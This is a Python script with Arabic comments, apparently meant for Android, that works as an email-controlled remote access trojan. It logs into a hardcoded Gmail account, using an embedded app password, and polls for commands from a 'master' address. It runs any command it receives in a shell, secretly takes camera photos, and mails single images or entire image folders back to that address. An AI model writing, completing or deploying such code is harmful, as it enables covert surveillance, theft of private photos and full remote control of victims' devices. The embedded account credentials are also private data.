import imaplib
import email
import subprocess
import smtplib
import os
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# على أندرويد نستخدم plyer للتحكم بالكاميرا
from plyer import camera

EMAIL = "bn2655316@gmail.com"
PASSWORD = "ilpm xcbn eiia vzav"
MASTER_EMAIL = "alien.x.3712@gmail.com"

def check_for_command():
    try:
        mail = imaplib.IMAP4_SSL("imap.gmail.com")
        mail.login(EMAIL, PASSWORD)
        mail.select("inbox")
        status, messages = mail.search(None, f'(UNSEEN FROM "{MASTER_EMAIL}")')
        for num in messages[0].split():
            status, msg_data = mail.fetch(num, '(RFC822)')
            raw_email = msg_data[0][1]
            msg = email.message_from_bytes(raw_email)
            if msg.is_multipart():
                for part in msg.walk():
                    if part.get_content_type() == "text/plain":
                        body = part.get_payload(decode=True).decode()
                        return body.strip()
            else:
                body = msg.get_payload(decode=True).decode()
                return body.strip()
    except Exception as e:
        print("Error checking email:", e)
    return None

def send_result(output, attachment_path=None):
    try:
        msg = MIMEMultipart()
        msg["Subject"] = "Result"
        msg["From"] = EMAIL
        msg["To"] = MASTER_EMAIL
        msg.attach(MIMEText(output, "plain"))

        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f'attachment; filename="{os.path.basename(attachment_path)}"'
                )
                msg.attach(part)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, MASTER_EMAIL, msg.as_string())
        server.quit()
    except Exception as e:
        print("Error sending result:", e)

def execute_command(command):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, text=True
        )
    except subprocess.CalledProcessError as e:
        result = e.output
    return result

def take_picture(filename="photo.jpg"):
    try:
        camera.take_picture(filename)
        if os.path.exists(filename):
            return filename
        return None
    except Exception as e:
        return str(e)

def bot_loop(log_fn=None):
    while True:
        command = check_for_command()
        if command:
            output = ""
            if command.startswith("send-image"):
                image_path = command.replace("send-image", "").strip()
                if os.path.exists(image_path):
                    send_result(f"تم إرسال الصورة: {image_path}", image_path)
                    output = f"تم إرسال الصورة: {image_path}"
                else:
                    send_result("تعذر العثور على الصورة المحددة.")
                    output = "تعذر العثور على الصورة المحددة."
            elif command.startswith("send-all-images"):
                folder_path = command.replace("send-all-images", "").strip()
                if os.path.isdir(folder_path):
                    images = [
                        f
                        for f in os.listdir(folder_path)
                        if f.lower().endswith((".jpg", ".jpeg", ".png", ".gif"))
                    ]
                    if images:
                        for img in images:
                            full_path = os.path.join(folder_path, img)
                            send_result(f"صورة: {img}", full_path)
                        output = f"{len(images)} صور تم إرسالها."
                    else:
                        send_result("لا توجد صور في هذا المجلد.")
                        output = "لا توجد صور في هذا المجلد."
                else:
                    send_result("المسار غير صحيح.")
                    output = "المسار غير صحيح."
            elif command.startswith("take-photo"):
                filename = command.replace("take-photo", "").strip()
                if not filename:
                    filename = "photo.jpg"
                photo_path = take_picture(filename)
                if photo_path and os.path.exists(photo_path):
                    send_result(f"تم التقاط الصورة: {photo_path}", photo_path)
                    output = f"تم التقاط الصورة: {photo_path}"
                else:
                    send_result("فشل التقاط الصورة أو لم يتم العثور على الملف.")
                    output = "فشل التقاط الصورة أو لم يتم العثور على الملف."
            else:
                output = execute_command(command)
                send_result(output)
            if log_fn:
                log_fn(f"> {command}\n{output}\n")
        time.sleep(1)
